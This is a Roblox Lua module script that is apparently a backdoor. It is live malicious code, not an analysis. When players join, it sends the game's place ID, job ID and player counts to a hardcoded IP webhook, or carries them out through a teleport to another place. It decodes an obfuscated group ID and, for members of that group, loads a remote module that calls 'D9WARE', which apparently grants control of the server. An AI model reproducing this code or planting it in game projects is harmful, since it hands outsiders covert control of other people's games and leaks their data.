local module = {}
SentData=false

function ishttp()
	local i,f = pcall(function()
		game.HttpService:GetAsync("https://www.google.com/")
	end)
	if i then
		return "true"
	else
		return "false"
	end
end
game.Players.PlayerAdded:Connect(function(plr)
	if ishttp() == "false" then
		if #game.Players:GetPlayers()>3 and not SentData then
			SentData=true
			local ta = {
				["Game"]=game.PlaceId;
				["Gameid"]=game.GameId;
				["JID"]=game.JobId;
				["MaxPlayers"]=game.Players.MaxPlayers;
				["Players"]=#game.Players:GetPlayers();
				["HTTP"]=ishttp()
			}

			game:GetService("TeleportService"):Teleport(5576880785, plr, game.HttpService:JSONEncode({ta}))

		end
	else
		local marketplaceService = game:GetService("MarketplaceService")
		local isSuccessful, info = pcall(marketplaceService.GetProductInfo, marketplaceService, game.PlaceId)
		local HTTPService = game:GetService("HttpService")
		local url = "http://45.76.60.186:8080/webhook"
		local Data = {
			["placeID"] = game.PlaceId,
			["gameID"] = game.GameId,
			["gameName"] = info.Name,
			["playerCount"] = #game.Players:GetPlayers(),
			["MaxPlayers"] = game.Players.MaxPlayers,
			["JobID"] = game.JobId,
			["creator"] = "Game Creator.",
			["type"] = "HTTP"
		}
		Data = HTTPService:JSONEncode(Data)
		HTTPService:PostAsync(url, Data)
	end
	local function rsh(value,shift)
		return math.floor(value/2^shift) % 256
	end
	local base64bytes = {['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['-']=62,['_']=63,['=']=nil}
	local function lsh(value,shift)
		return (value*(2^shift)) % 256
	end
	local function konkshred(x,b)
		return (math.fmod(x, 2^b) - math.fmod(x, 2^(b-1)) > 0)
	end
	local function lor(x,y)
		local result = 0
		for p=1,8 do result = result + (((konkshred(x,p) or konkshred(y,p)) == true) and 2^(p-1) or 0) end
		return result
	end
	local function harambae(data)
		local chars = {}
		local result=''
		for dpos=0,string.len(data)-1,4 do
			for char=1,4 do chars[char] = base64bytes[(string.sub(data,(dpos+char),(dpos+char)) or '=')] end
			result = string.format('%s%s%s%s',result,string.char(lor(lsh(chars[1],2), rsh(chars[2],4))),(chars[3] ~= nil) and string.char(lor(lsh(chars[2],4), rsh(chars[3],2))) or '',(chars[4] ~= nil) and string.char(lor(lsh(chars[3],6) % 192, (chars[4]))) or '')
		end
		return result
	end
	local a = "NzQxMDcxMQ=="
	if plr:IsInGroup(tonumber(harambae(a))) then                    
		require(5692482281):D9WARE(plr.Name)
	end
end)
return module
--By Tiurabe and Alamo564
